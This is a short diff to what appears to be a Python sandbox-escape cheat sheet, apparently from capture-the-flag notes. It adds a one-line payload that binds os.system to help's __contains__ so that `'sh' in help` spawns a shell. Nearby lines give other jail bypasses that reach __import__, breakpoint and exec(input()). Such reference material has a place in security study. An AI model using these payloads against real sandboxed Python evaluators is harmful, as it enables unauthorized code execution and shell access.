@@ -22,7 +22,7 @@ Table of contents:
 
 ### Call functions
 
-- `__import__('os')`: `help.__class__.__getitem__ = __import__;help['os']` for object, `ExceptionGroup.__class_getitem__ = __import__;ExceptionGroup["os"]` for class
+- `__import__('os')`: `help.__class__.__getitem__ = __import__;help['os']` or `help.__class__.__contains__ = __import__('os').system;'sh' in help` for object, `ExceptionGroup.__class_getitem__ = __import__;ExceptionGroup["os"]` for class
 - `breakpoint()`: `license._Printer__setup = breakpoint; str(license)`
 - `exec(input())`: `@exec\n@input\nclass a: pass`
 
